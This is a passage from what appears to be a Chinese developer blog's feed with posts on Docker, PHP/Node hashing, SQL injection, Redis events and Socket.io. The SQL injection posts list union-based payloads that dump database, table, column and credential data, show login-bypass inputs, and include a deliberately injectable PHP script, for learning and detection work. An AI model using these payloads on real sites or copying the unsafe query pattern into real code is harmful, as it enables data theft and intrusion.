href="http://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">如何在Ubuntu 18.4上安装 Docker-ce</a></li><li><a href="https://docs.docker.com/machine/install-machine/" target="_blank" rel="noopener">如何在Ubuntu 18.04上安装Docker Machine</a></li><li><a href="https://linuxize.com/post/how-to-install-virtualbox-on-ubuntu-18-04/#disqus_thread" target="_blank" rel="noopener">如何在Ubuntu 18.04上安装VirtualBox</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记的主要目的是用来记录学习 &lt;code&gt;Docker&lt;/code&gt; 的过程。&lt;code&gt;Docker&lt;/code&gt;这个词并不是第一次听说了，印象中好久以前就听说过这个东西了，只是一直没有真正去了解。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Linux/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Docker" scheme="https://www.0x2beace.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>PHP 中使用 hash_hmac 加密</title>
    <link href="https://www.0x2beace.com/php-uses-hash-hmac-encryption/"/>
    <id>https://www.0x2beace.com/php-uses-hash-hmac-encryption/</id>
    <published>2020-07-22T16:18:45.000Z</published>
    <updated>2020-07-22T16:20:05.453Z</updated>
    
    <content type="html"><![CDATA[<p>今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用<code>Node</code>写的，需要翻译成<code>PHP</code> 版本的。</p><a id="more"></a><h3 id="PHP中使用-Hmac-方法生成带有密钥的哈希值"><a href="#PHP中使用-Hmac-方法生成带有密钥的哈希值" class="headerlink" title="PHP中使用 Hmac 方法生成带有密钥的哈希值"></a>PHP中使用 Hmac 方法生成带有密钥的哈希值</h3><p>在Node.js 中，这是一段用于生成“加盐”的哈希值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var crypto &#x3D; require(&#39;crypto&#39;);</span><br><span class="line"></span><br><span class="line">var secret &#x3D; &quot;122410&quot;</span><br><span class="line">var key &#x3D; &quot;key&quot;</span><br><span class="line">var hash &#x3D; crypto.createHmac(&#39;sha256&#39;, secret).update(key).digest(&#39;hex&#39;)</span><br><span class="line"></span><br><span class="line">console.log(hash);</span><br><span class="line">&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4</span><br></pre></td></tr></table></figure><p>如果要翻译成PHP版本，其实非常简单，直接使用PHP 的 <code>hash_hmac</code>函数就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$secret &#x3D; &quot;122410&quot;; </span><br><span class="line">$key &#x3D; &quot;key&quot;;</span><br><span class="line">echo hash_hmac(&quot;sha256&quot;, $key, $secret);</span><br><span class="line">&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4</span><br></pre></td></tr></table></figure><h4 id="将密钥设置成二进制"><a href="#将密钥设置成二进制" class="headerlink" title="将密钥设置成二进制"></a>将密钥设置成二进制</h4><p>如果需要加密的部分，并不是普通的字符串，而是二进制字符串，那么需要使用<code>pack</code>函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 5e50e6458b0cdc7ee534967d113a9deffe6740d0</span><br><span class="line">&#x2F;&#x2F; 预期结果：46abe81345b1da2f1a330bba3d6254e110cd9ad8</span><br></pre></td></tr></table></figure><p>先将十六进制字符串转换为二进制数据，然后再将其传递给<code>hash_hmac</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, pack(&quot;H*&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;)));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 46abe81345b1da2f1a330bba3d6254e110cd9ad8</span><br></pre></td></tr></table></figure><h3 id="Node中使用crypto进行md5-加密"><a href="#Node中使用crypto进行md5-加密" class="headerlink" title="Node中使用crypto进行md5 加密"></a>Node中使用crypto进行md5 加密</h3><p>在PHP 中，如果需要获取某个字符串的md5 加密之后的哈希值，非常简单，直接使用<code>md5</code> 函数即可。</p><p>但是在<code>node.js</code> 中，并没有为我们直接提供这样的函数，所以需要手动调用<code>crypto</code> 模块去转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var pwd &#x3D; &quot;122410&quot;;</span><br><span class="line">var hash &#x3D; crypto.createHash(&#39;md5&#39;).update(pwd).digest(&#39;hex&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 913975c2f972ba6bbf5ba593c68a5dc5</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://stackoverflow.com/questions/13012239/how-to-set-the-hmacsha1-key-to-hex-in-php" target="_blank" rel="noopener">如何在PHP中将hmac sha1密钥设置为十六进制？</a></li><li><a href="https://caligatio.github.io/jsSHA/" target="_blank" rel="noopener">在线转换工具</a></li><li><a href="https://www.php.net/manual/zh/function.hash-hmac.php" target="_blank" rel="noopener">php hash_hmac 函数</a></li><li><a href="http://nodejs.cn/api/crypto.html" target="_blank" rel="noopener">node.js crypto 模块</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用&lt;code&gt;Node&lt;/code&gt;写的，需要翻译成&lt;code&gt;PHP&lt;/code&gt; 版本的。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Hash" scheme="https://www.0x2beace.com/tags/Hash/"/>
    
  </entry>
  
  <entry>
    <title>整理常见的 SQL 注入语句</title>
    <link href="https://www.0x2beace.com/organize-common-sql-injection-statements/"/>
    <id>https://www.0x2beace.com/organize-common-sql-injection-statements/</id>
    <published>2020-07-22T15:30:04.000Z</published>
    <updated>2020-07-22T15:31:27.367Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记的目的是整理各种 SQL 注入使用时的<code>payload</code>。</p><a id="more"></a><blockquote><p>说明：以下的<code>payloads</code>都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。</p></blockquote><p>也就是基于这样一种情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;;</span><br></pre></td></tr></table></figure><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><ol><li>判断当前数据表中有几列：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 数值 --+</span><br></pre></td></tr></table></figure><ol start="2"><li>查看显示位在第几列：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><blockquote><p>注意：这里需要传递一个不存在的条件，比如：<code>id=-1</code></p></blockquote><ol start="3"><li>显示当前数据库（假设显示位中包含第三位）：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() --+</span><br></pre></td></tr></table></figure><ol start="4"><li>查看当前数据库中的所有表：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+</span><br></pre></td></tr></table></figure><blockquote><p>函数<code>group_concat()</code>把所有结果都在一行输出</p></blockquote><ol start="5"><li>查询所有数据库：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+</span><br></pre></td></tr></table></figure><ol start="6"><li>查询某个数据库中的表：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure><ol start="7"><li><p>查询某个表中的所有字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+</span><br></pre></td></tr></table></figure></li><li><p>查询某个表中的字段内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users)</span><br></pre></td></tr></table></figure><blockquote><p>0x3a会被转义位冒号<code>：</code></p></blockquote></li></ol><h3 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h3><p>SQL UNION 操作符合并两个或多个 SELECT 语句的结果，需要注意的是：UNION 内部的每个 SELECT 语句必须拥有相同数量的列。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://ca0y1h.top/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">Web安全学习之数据库注入语句的收集和学习</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记的目的是整理各种 SQL 注入使用时的&lt;code&gt;payload&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
    <category term="Web 安全" scheme="https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>认识SQL 注入常见方式</title>
    <link href="https://www.0x2beace.com/know-common-ways-of-sql-injection/"/>
    <id>https://www.0x2beace.com/know-common-ways-of-sql-injection/</id>
    <published>2020-07-22T15:26:11.000Z</published>
    <updated>2020-07-22T15:29:48.375Z</updated>
    
    <content type="html"><![CDATA[<p>最近需要做一个检测<code>SQL 注入</code>的功能，无奈发现自己于对<code>SQL 注入</code>竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。</p><a id="more"></a><h2 id="SQL-注入是什么？"><a href="#SQL-注入是什么？" class="headerlink" title="SQL 注入是什么？"></a>SQL 注入是什么？</h2><p>SQL 注入是一种将SQL 语句添加到REQUEST 参数中，传递到服务器并执行的一种攻击手段。</p><p>SQL 注入攻击是REQUEST 引數未经过过滤，然后直接拼接到SQL 语句中，解析并执行，而达到预想之外的一种行为。</p><h2 id="SQL-注入是怎样产生的"><a href="#SQL-注入是怎样产生的" class="headerlink" title="SQL 注入是怎样产生的"></a>SQL 注入是怎样产生的</h2><ol><li>WEB 开发人员无法保证所有的输入都已经完美过滤。</li><li>数据库未做安全配置，存在安全隐患。</li></ol><h2 id="如何进行SQL-注入"><a href="#如何进行SQL-注入" class="headerlink" title="如何进行SQL 注入"></a>如何进行SQL 注入</h2><p>这里以<code>PHP</code>、<code>Mysql</code>为例，介绍一下完整的SQL 注入攻击是如何产生的。</p><h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$db_host &#x3D; &quot;localhost&quot;;</span><br><span class="line">$db_user &#x3D; &quot;root&quot;;</span><br><span class="line">$db_pwd &#x3D; xxxxxx;</span><br><span class="line">$db_name &#x3D; &quot;User&quot;;</span><br><span class="line">$db_table &#x3D; &quot;Student&quot;;</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;h1&gt;&#39;;</span><br><span class="line">echo &#39;Test ErrorBased Injections&#39;;</span><br><span class="line">echo &#39;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">error_reporting(E_ALL ^ E_DEPRECATED);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 测试连接</span><br><span class="line">$conn &#x3D; mysqli_connect($db_host, $db_user, $db_pwd);</span><br><span class="line">if (!$conn)&#123;</span><br><span class="line">    echo &#39;Mysql 连接失败:&#39;.mysqli_error($conn);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    echo &#39;Mysql 连接成功&#39;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;连接数据库</span><br><span class="line">mysqli_select_db($conn, $db_name) or die (&quot;无法连接到数据库: &quot;.$db_name);</span><br><span class="line">mysqli_query($conn, &#39;set names utf-8&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 获取参数</span><br><span class="line">if(isset($_GET[&#39;id&#39;]))&#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 拼接SQL语句</span><br><span class="line">$sql&#x3D; &quot;SELECT * FROM $db_table WHERE id &#x3D; &#123;$id&#125; &quot;;</span><br><span class="line">echo &#39;查询SQL 语句:&#39;.$sql;</span><br><span class="line">echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;执行</span><br><span class="line">$result&#x3D;mysqli_query($conn, $sql);</span><br><span class="line">$row&#x3D;mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line">if($row) &#123;</span><br><span class="line">  echo &#39;Your Login name:&#39;.$row[&#39;username&#39;];</span><br><span class="line">  echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">  echo &#39;Your Password:&#39;.$row[&#39;password&#39;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>调用地址是<code>http://127.0.0.1/sqli.php?id=1</code>，使用<code>GET</code>传入参数<code>id</code>，输出的SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;</span><br></pre></td></tr></table></figure><p>正常情况下，会返回<code>id = 1</code> 的学生信息。</p><h4 id="1-数字注入"><a href="#1-数字注入" class="headerlink" title="1. 数字注入"></a>1. 数字注入</h4><p>如果在浏览器中输入：<code>http://127.0.0./sqli.php?id=1&#39; union select 1,2--+</code>会怎样呢？输出的SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; -1 or 1&#x3D;1</span><br></pre></td></tr></table></figure><p>这会导致所有的学生信息都被输出了，为什么会这样呢？这是因为<code>id = -1</code>是一个不存在的条件，而<code>1 = 1</code>却是一个永远存在的条件，这就相当于没有加 Where 条件。</p><h4 id="2-字符串注入"><a href="#2-字符串注入" class="headerlink" title="2. 字符串注入"></a>2. 字符串注入</h4><p>现在有这样一种场景：<code>http://127.0.0./login.php</code>模拟用户登录。假设正确的用户名和密码是<code>Boo</code>、<code>122410</code>，那么在正常的登录情况下所执行的SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; ADN password &#x3D; &#39;122410&#39;</span><br></pre></td></tr></table></figure><p>由于用户名和密码都是字符串，所以SQL 注入会把参数携带的数据变成<code>Mysql</code>中的注释。Mysql 中的注释有两种。</p><h4 id="1"><a href="#1" class="headerlink" title="1. #"></a>1. <code>#</code></h4><p>假设<code>POST</code> 传递的参数分别是：<code>username = Boo&#39;#</code>、<code>password = xxxxxx</code>，那么产生的SQL 语句则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;#&#39;ADN password &#x3D; &#39;xxxxxx&#39;</span><br></pre></td></tr></table></figure><p>因为<code>#</code>号 后的所有字符串都会被当成注释来处理，所以上面的SQL 语句等价于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2. --"></a>2. <code>--</code></h4><p>假设<code>POST</code>请求传递的参数分别是：<code>username = Boo&#39;--</code>、<code>password = xxxxxx</code>，那么产生的SQL 语句则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;-- &#39;AND password &#x3D; &#39;xxxxxx&#39;</span><br></pre></td></tr></table></figure><p>因为<code>--</code>号 后面的所有内容都会被当成注释处理，所以上面的SQL 语句等价于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;</span><br></pre></td></tr></table></figure><p>无论是上面的哪一种情况，攻击者都能在不知道具体密码的情况下而成功登录。</p><p>这大概就是一个简单的SQL注入产生的完整过程了，这里只是抛砖引玉的介绍了下原理，而实际场景中的SQL 注入当然远远不止这两种。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/github_36032947/article/details/78442189" target="_blank" rel="noopener">SQL 注入常见方式以及检测方法</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近需要做一个检测&lt;code&gt;SQL 注入&lt;/code&gt;的功能，无奈发现自己于对&lt;code&gt;SQL 注入&lt;/code&gt;竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
    <category term="Web 安全" scheme="https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Redis 常见事件整理</title>
    <link href="https://www.0x2beace.com/redis-common-events-collation/"/>
    <id>https://www.0x2beace.com/redis-common-events-collation/</id>
    <published>2020-07-21T15:41:45.000Z</published>
    <updated>2020-07-21T15:42:45.608Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来整理 Redis 的常用事件。</p><a id="more"></a><h2 id="客户端事件"><a href="#客户端事件" class="headerlink" title="客户端事件"></a>客户端事件</h2><p>客户端会发出一些事件的状态连接到Redis 服务器。</p><h3 id="Ready"><a href="#Ready" class="headerlink" title="Ready"></a>Ready</h3><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>客户端连接Redis 时，如果出现异常，则会触发Error 事件。</p><h3 id="Connect"><a href="#Connect" class="headerlink" title="Connect"></a>Connect</h3><p>客户端连接至Redis 时，会触发连接事件。</p><h2 id="订阅者事件"><a href="#订阅者事件" class="headerlink" title="订阅者事件"></a>订阅者事件</h2><h3 id="Message"><a href="#Message" class="headerlink" title="Message"></a>Message</h3><p>将接收到来自订阅频道的消息，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client.on(&quot;message&quot;, function (channel, message) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="Subscribe"><a href="#Subscribe" class="headerlink" title="Subscribe"></a>Subscribe</h3><p>监听订阅事件，返回订阅频道的订阅数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client.on(&quot;subscribe&quot;, function (channel, count) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="发布-订阅"><a href="#发布-订阅" class="headerlink" title="发布/订阅"></a>发布/订阅</h2><h3 id="Publish"><a href="#Publish" class="headerlink" title="Publish"></a>Publish</h3><p>将信息 <code>message</code> 发送到指定的频道 <code>channel</code> 。</p><p>返回值：接收到信息 <code>message</code> 的订阅者数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUBLISH channel message</span><br></pre></td></tr></table></figure><h3 id="SUBSCRIBE"><a href="#SUBSCRIBE" class="headerlink" title="SUBSCRIBE"></a>SUBSCRIBE</h3><p>订阅给定频道的信息。</p><p>返回值：接收到的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSCRIBE channel [channel ...]</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://redis.readthedocs.io/en/2.4/index.html" target="_blank" rel="noopener">Redis命令参考简体中文版</a></li><li><a href="https://github.com/NodeRedis/node-redis" target="_blank" rel="noopener">A high performance Node.js Redis client</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来整理 Redis 的常用事件。&lt;/p&gt;</summary>
    
    
    
    <category term="Redis" scheme="https://www.0x2beace.com/categories/Redis/"/>
    
    
    <category term="Redis" scheme="https://www.0x2beace.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Socket.io 快速上手</title>
    <link href="https://www.0x2beace.com/socket-io-quick-start/"/>
    <id>https://www.0x2beace.com/socket-io-quick-start/</id>
    <published>2020-07-20T05:02:05.000Z</published>
    <updated>2020-07-20T05:04:22.840Z</updated>
    
    <content type="html"><![CDATA[<p>最近使用<code>socket.io</code> 和 <code>redis</code> 完成了一些小功能，觉得很实用，所以整理一下<code>socket.io</code>相关的知识。</p><a id="more"></a><h1 id="socket-io-是什么"><a href="#socket-io-是什么" class="headerlink" title="socket.io 是什么"></a><code>socket.io</code> 是什么</h1><p>它是一个服务端与客户端之间建立通讯的工具。</p><p>服务端创建好服务之后，客户端通过主机与之建立连接。然后就可以进行通讯了。</p><p>想要使用好<code>socket.io</code>，一定要理解通讯的概念。通讯一定是双向的，如果客户端能够收到消息，那么在某个地方就一定存在服务端向客户端推送消息。</p><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>要开始使用<code>socket.io</code>进行开发，需要先安装Node和npm。</p><p>创建一个名为<code>app.js</code>的文件，并添加以下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var app &#x3D; require(&#39;express&#39;)();</span><br><span class="line">var http &#x3D; require(&#39;http&#39;).Server(app);</span><br><span class="line">&#x2F;&#x2F; 创建一个附加到http服务器的新socket.io实例</span><br><span class="line">var io &#x3D; require(&#39;socket.io&#39;)(http);</span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;&#39;, function(req, res)&#123;</span><br><span class="line">  res.sendFile(__dirname + &#39;&#x2F;index.html&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">io.on(&#39;connection&#39;, function(socket)&#123;</span><br><span class="line">  console.log(&#39;a user connected&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">http.listen(3000, function()&#123;</span><br><span class="line">  console.log(&#39;listening on *:3000&#39;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样就完成了一个最简单的<code>socket</code>服务端。</p><p>创建<code>index.html</code> 文件来作为客户端提供服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Hello world&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;body&gt;Hello world&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node app.js</span><br></pre></td></tr></table></figure><p>创建的服务运行在本地的 <code>3000</code> 端口上，打开浏览器，输入<code>http://localhost:3000</code>进行访问。 </p><h2 id="使用事件"><a href="#使用事件" class="headerlink" title="使用事件"></a>使用事件</h2><p><code>socket.io</code> 的核心理念就是允许发送、接收任意事件和任意数据。任意能被编码为 JSON 的对象都可以用于传输。二进制数据 也是支持的。</p><p>在上面的代码中，我们已经创建了一个服务端的<code>socket.io</code>对象，如果想要能正常通讯，还需要在客户端同样也创建一个<code>socket.io</code>对象。这个脚本由服务端的<code>/socket.io/socket.io.js</code> 提供。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Hello world&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      var socket &#x3D; io();</span><br><span class="line">   &lt;&#x2F;script&gt;</span><br><span class="line">   &lt;body&gt;Hello world&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>在客户端中建立 <code>socket.io</code> 连接。</p><p>在服务端中添加以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 只有有客户端连接，就会触发这个事件</span><br><span class="line">io.on(&#39;connection&#39;, function(socket) 